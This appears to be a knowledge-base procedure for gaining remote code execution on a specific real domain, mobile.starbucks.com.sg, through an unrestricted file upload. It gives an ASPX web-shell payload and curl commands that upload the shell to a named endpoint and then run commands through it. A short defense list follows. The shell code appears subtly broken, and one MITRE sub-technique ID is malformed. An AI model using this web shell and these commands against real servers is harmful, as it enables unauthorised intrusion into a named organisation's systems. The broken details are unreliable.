---
tags:
  - rce
  - file-upload
  - web-shell
  - asp.net-exploit
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-malicious-upload]]'
platforms:
  - Web
techniques:
  - '[[Remote File Copy]]'
  - '[[Windows Command Shell]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[T1059.003.001]]'
id: b8b8d814-4ca8-4cb5-b37c-b21f666905e8
created_at: '2025-12-14T05:32:13.794Z'
updated_at: '2025-12-14T05:32:13.794Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[Windows Command Shell]]'
---
# Upload-Malicious-File-for-RCE

## Summary

This procedure exploits the unrestricted file upload by submitting a malicious ASPX web shell to the .ashx endpoint on mobile.starbucks.com.sg, enabling remote code execution on the server.

## Description

Once restrictions are confirmed absent, attackers upload an ASPX file containing server-side code (e.g., a simple command executor) that the ASP.NET server will process. The file is stored in a web-root directory, allowing direct access via HTTP to trigger execution. This leads to RCE, potentially compromising the entire application server.

## Requirements

1. Confirmed vulnerable endpoint
2. Malicious ASPX shell file (e.g., shell.aspx with <%@ Page Language="C#" %> <script>Response.Write(System.Diagnostics.Process.Start(Request["cmd"]).StandardOutput.ReadToEnd());</script>)
3. HTTP client for upload and follow-up access

## Defense

Defensive measures and detection strategies:

- Restrict uploads to isolated, non-executable directories
- Disable script execution in upload folders
- Use runtime protections like ASP.NET request validation

## Objectives

1. Successfully upload executable malicious file
2. Access and execute code via the uploaded shell
3. Demonstrate server compromise

## Instructions

### Step 1: Craft Malicious File

**Context**: Create an ASPX web shell for command execution.

**Command** (Manual file creation):

> Create shell.aspx with content enabling cmd parameter execution.

### Step 2: Upload Shell

**Context**: Post the file to the endpoint.

**Command** ([[commands/curl-malicious-upload]]):
```bash
curl -X POST https://mobile.starbucks.com.sg/upload.ashx -F "file=@shell.aspx" -v
```

> Upload succeeds if no restrictions. Note the response path.

### Step 3: Execute Commands

**Context**: Access the shell to run system commands.

**Command** ([[commands/curl-malicious-upload]] with query):
```bash
curl "https://mobile.starbucks.com.sg/uploads/shell.aspx?cmd=whoami" -v
```

> Expected output: Server username or command result, confirming RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]
- [[Windows Command Shell]]

### Sub-Techniques

- [[T1059.003.001]]

## Commands Used

- [[commands/curl-malicious-upload]]

## Tools Used


## Tags

- [[rce]]
- [[web-shell]]
